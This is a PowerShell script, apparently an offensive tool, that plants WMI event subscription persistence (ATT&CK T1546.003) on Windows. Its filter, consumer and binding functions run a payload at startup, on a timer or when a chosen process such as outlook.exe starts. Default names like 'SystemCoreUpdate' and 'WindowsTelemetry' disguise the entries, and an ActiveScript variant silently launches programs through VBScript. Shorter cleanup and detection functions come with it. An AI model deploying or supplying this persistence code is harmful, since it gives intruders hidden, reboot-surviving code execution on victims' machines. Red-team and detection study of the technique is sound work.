<#
.SYNOPSIS
    WMI event subscription persistence.
.DESCRIPTION
    Creates WMI event subscriptions that survive reboots: EventFilter +
    EventConsumer + FilterToConsumerBinding. Includes detection and cleanup.
.NOTES
    MITRE ATT&CK: T1546.003 — WMI Event Subscription
    Requires: Administrative privileges
#>

function Plant-WMIPersistence {
    param(
        [string]$Name = "SystemCoreUpdate",
        [string]$Command = "C:\temp\payload.exe",
        [ValidateSet("Startup","Interval","ProcessStart")]
        [string]$Trigger = "Startup",
        [int]$IntervalSeconds = 300,
        [string]$ProcessName = "explorer.exe"
    )

    $filterQuery = switch ($Trigger) {
        "Startup" {
            "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"
        }
        "Interval" {
            "SELECT * FROM __InstanceModificationEvent WITHIN $IntervalSeconds WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        "ProcessStart" {
            "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = '$ProcessName'"
        }
    }

    # Event Filter
    $filterParams = @{
        EventNamespace = 'root\cimv2'
        Name = "${Name}_Filter"
        QueryLanguage = 'WQL'
        Query = $filterQuery
    }
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams

    # CommandLine Event Consumer
    $consumerParams = @{
        Name = "${Name}_Consumer"
        CommandLineTemplate = $Command
    }
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerParams

    # Binding
    $bindingParams = @{
        Filter = $filter
        Consumer = $consumer
    }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingParams | Out-Null

    Write-Output "[+] WMI Persistence planted:"
    Write-Output "    Name     : $Name"
    Write-Output "    Trigger  : $Trigger"
    Write-Output "    Command  : $Command"
    Write-Output "    Filter   : ${Name}_Filter"
    Write-Output "    Consumer : ${Name}_Consumer"
}

function Plant-WMIActiveScript {
    param(
        [string]$Name = "WindowsTelemetry",
        [string]$ScriptText = 'Set objShell = CreateObject("WScript.Shell") : objShell.Run "C:\temp\payload.exe", 0, False'
    )

    $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 180"

    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        EventNamespace = 'root\cimv2'
        Name = "${Name}_Filter"
        QueryLanguage = 'WQL'
        Query = $filterQuery
    }

    $consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{
        Name = "${Name}_Consumer"
        ScriptingEngine = 'VBScript'
        ScriptText = $ScriptText
    }

    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter
        Consumer = $consumer
    } | Out-Null

    Write-Output "[+] WMI ActiveScript persistence planted: $Name"
}

function Remove-WMIPersistence {
    param([string]$Name = "SystemCoreUpdate")

    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
        Where-Object { $_.Filter -match $Name } | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $Name } | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $Name } | Remove-WmiObject
    Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $Name } | Remove-WmiObject

    Write-Output "[-] Removed WMI persistence: $Name"
}

function Detect-WMIPersistence {
    Write-Output "[*] WMI Event Filters:"
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Output "  [Filter] $($_.Name): $($_.Query)" }

    Write-Output "`n[*] WMI CommandLine Consumers:"
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Output "  [Consumer] $($_.Name): $($_.CommandLineTemplate)" }

    Write-Output "`n[*] WMI ActiveScript Consumers:"
    Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Output "  [Consumer] $($_.Name): $($_.ScriptText)" }

    Write-Output "`n[*] WMI Bindings:"
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
        ForEach-Object { Write-Output "  [Binding] Filter=$($_.Filter) -> Consumer=$($_.Consumer)" }
}

Write-Output @"
[*] WMI Persistence Functions Loaded:

    Plant:
      Plant-WMIPersistence -Name "Update" -Command "C:\temp\payload.exe" -Trigger Startup
      Plant-WMIPersistence -Name "Beacon" -Command "C:\temp\payload.exe" -Trigger Interval -IntervalSeconds 300
      Plant-WMIPersistence -Name "Hook" -Command "C:\temp\payload.exe" -Trigger ProcessStart -ProcessName "outlook.exe"
      Plant-WMIActiveScript -Name "Telemetry" -ScriptText 'Set s = CreateObject("WScript.Shell") : s.Run "cmd", 0'

    Cleanup:
      Remove-WMIPersistence -Name "Update"

    Detection:
      Detect-WMIPersistence
"@
